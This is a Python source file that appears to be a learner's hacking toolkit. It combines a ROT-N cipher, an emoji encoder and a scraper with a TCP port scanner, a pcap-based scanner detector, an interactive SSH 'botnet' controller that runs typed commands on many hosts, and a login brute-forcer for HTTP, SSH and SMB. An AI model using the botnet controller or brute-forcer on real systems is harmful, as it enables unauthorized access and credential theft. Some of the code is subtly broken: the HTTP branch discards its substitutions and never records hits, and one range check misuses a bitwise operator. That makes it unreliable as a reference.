import time

def rot_n_cipher(text: str, movement: int) -> str:
    ascii_list= [ord(char) for char in text]

    for i, n in enumerate(ascii_list):
        if 64 < n & n <91:
            if (n + movement) % 90 < 65:
                ascii_list[i] = (n + movement) % 90 + 65
            else:
                ascii_list[i] = (n + movement)

        elif 96 < n & n <123:
            if (n + movement) % 122 < 97:
                ascii_list[i] = (n + movement) % 122 + 97
            else:
                ascii_list[i] = (n + movement)

        else:
            raise ValueError("only accept letters")

    return "".join(chr(val) for val in ascii_list)

import re
def text_to_emoji(text:str)->str:

    unicode_list=web_scrape("https://unicode.org/emoji/charts/full-emoji-list.html","a",{'name':re.compile(r"^1f")})

    final_list=[code.replace("U+",r"\U000") for code in unicode_list if " " not in code]

    ascii_list=[]
    for char in text:
        if  64 < ord(char) < 91:
            ascii_list.append(final_list[ord(char)-65])
        elif 96 < ord(char) < 123:
            ascii_list.append(final_list[ord(char)-97+26])
        else:
            raise ValueError("only letters")
    print(ascii_list)
    ciphertext="".join(val.encode('utf-8').decode('unicode_escape') for val in ascii_list)
    return ciphertext

import requests
from bs4 import BeautifulSoup
def web_scrape(url:str,tag:str,attr_regex:dict)-> list[str]|str:
    response = requests.get(url)

    if response.status_code==200:
        soup = BeautifulSoup(response.text, 'html.parser')
        listing=soup.find_all(tag, attrs=attr_regex)
        final_list=[results.get_text() for results in listing]
    else:
        raise ValueError("cannot reach")

    return final_list

import socket

def port_scanner(ip:str,port:int) -> int:

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(10)

        #returns zero if successful
        return s.connect_ex((ip, port))

from scapy.all import PcapReader
from typing import NamedTuple
class Instance(NamedTuple):
    ip_src: str
    ip_dst: str
    timestamp: tuple
    sport: int
    dport: int

def ip_pcap_parser(path:str,ip_src:str=None,ip_dst:str=None) ->  list[Instance]:

    with PcapReader(path) as packets:
        parsed_list=[Instance(packet["IP"].src,packet["IP"].dst, getattr(packet["TCP"], 'options', None) ,packet["TCP"].sport,packet["TCP"].dport) for packet in packets if packet.haslayer("IP") and packet.haslayer("TCP") and (ip_src is None or packet['IP'].src==ip_src) and (ip_dst is None or packet['IP'].dst==ip_dst)]
    return parsed_list

def detect_scanners(path: str, my_ip:str=None) -> str:

    scanning_ips=[]

    parsed_list=ip_pcap_parser(path, None, my_ip)
    ips_set={dp.ip_src for dp in parsed_list}

    for ip in ips_set:
        port_scanned={dp.dport for dp in parsed_list if dp.ip_src==ip}
        if len(port_scanned) > 5:
            scanning_ips.append(ip)
    if len(scanning_ips)==0:
        return "no scanners detected"
    else:
        final_list=",".join(ips for ips in scanning_ips)

    return f"your ip is likely being by scanned by {final_list}"

import paramiko
import getpass

def para_connector(bot:str,port:int,username:str,password:str):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(bot, port, username, password)
        return client
    except Exception as e:
        raise ValueError(f"Failed to connect to {bot}: {e}")

def ssh_botnet(bot_ip_port: list[tuple], username: str) -> int:
    password = getpass.getpass("Password: ")
    clients = [para_connector(bot,port,username,password) for (bot, port) in bot_ip_port]
    if len(clients) < 1:
        raise ValueError("no host")
    while True:
        choice = input("""Enter choice (using only numbers): 
1. List bots and their session numbers
2. Execute command on a particular bot
3. quit 
enter choice: """)
        match choice:
            case '1':
                address_info = [bot.get_transport().sock.getpeername() for bot in clients]
                result="""SESSION NO.| IP ADDR
==================\n"""
                result += r"\n".join(f"{i}. {bot[0]}" for i, bot in enumerate(address_info))
                print(result)
            case '2':
                session = int(input("which session number? can use option 1 to see. \n"))
                command = input("Command: ")
                stdin, stdout, stderr = clients[session].exec_command(command)
                error_output=stderr.read().decode().strip()
                if error_output:
                    raise ValueError(error_output)
                else:
                    print(stdout.read().decode().strip())
            case '3':
                print("Goodbye!")
                for client in clients:
                    client.close()
                break
            case _: # Catch-all for any other input
                print("Invalid selection.")
    return 1

from itertools import product

def brute_forcer(mode:str,host:str,users:list[str],passwords:list[str],sample_request:str=None,user_param:str=None,pass_param:str=None,delay:int=3,port:int=None,domain:str=None) -> list | str:
    if "http" in mode.lower() and (sample_request is None or user_param is None or pass_param is None):
        raise ValueError("http mode requires additional file, user_param and pass_param that contains request")
    correct_creds=[]
    match mode.lower():
        case s if re.search(r"https?",s):
            import requests
            port = port or (443 if mode.lower() == "https" else 80)
            with (open(sample_request, 'r',encoding='utf-8') as file):
                file_contents = file.read()
                if "^USER^" not in file_contents or "^PASS^" not in file_contents:
                    raise ValueError("need to indicate placeholders for username/password in sample request using ^USER^ and ^PASS^")
                try:
                    header_section, body = file_contents.split('\r\n\r\n', 1)
                    method, headers = header_section.split('\r\n', 1)
                except:
                    raise ValueError("ensure request is formatted as header+2crlf+body")
                req_headers = {key.strip(): val.strip() for key, val in (line.split(":",1) for line in headers.split("\r\n") if ":" in line)}
                path, _, params = method.split()[1].partition("?")
                match method:
                    case s if s.startswith("GET"):

                        for username, password in product(users, passwords):
                            params.replace("^USER^", username).replace("^PASS^",password)
                            params_dict = {key.strip(): val.strip() for key, val in
                                           (key_pair.split("=", 1) for key_pair in params.split("&"))}
                            try:
                                requests.get(host+":"+str(port)+path,headers=req_headers,params=params_dict)
                            except Exception as e:
                                raise ValueError(f"the error:{e} for {username}/{password}")
                            time.sleep(delay)
                        return correct_creds
                    case s if s.startswith("POST"):
                        for username, password in product(users, passwords):
                            try:
                                params_dict = {key.strip(): val.strip() for key, val in
                                               (key_pair.split("=", 1) for key_pair in params.split("&"))}
                                body.replace("^USER^", username).replace("^PASS^", password)
                                requests.post(host+":"+str(port)+path,params=params_dict,data=body)
                            except:
                                raise
                        return correct_creds
                    case _:
                        raise ValueError("http methods available for testing are POST or GET")
        case "ssh":
            port = port or 22
            import paramiko
            for username, password in product(users,passwords):
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(host, port, username, password)
                    correct_creds.append((username, password))
                    client.close()
                except Exception as e:
                    print(f"Connection failed: {e} for {username}:{password}")
                time.sleep(delay)
            return correct_creds
        case "smb":
            port = port or 445
            domain = domain or "."
            from smb.SMBConnection import SMBConnection
            from smb.smb_structs import OperationFailure
            for username, password in product(users,passwords):
                try:
                    conn = SMBConnection(username, password, "client_name", host, domain=domain, use_ntlm_v2=True)
                    result = conn.connect(host, port)
                    if result:
                        correct_creds.append((username, password))
                    conn.close()
                except OperationFailure as e:
                    raise ValueError(f"Connection failed: {e} for {username}:{password}")
                time.sleep(delay)
            return correct_creds
        case _:
            return "unidentified mode"
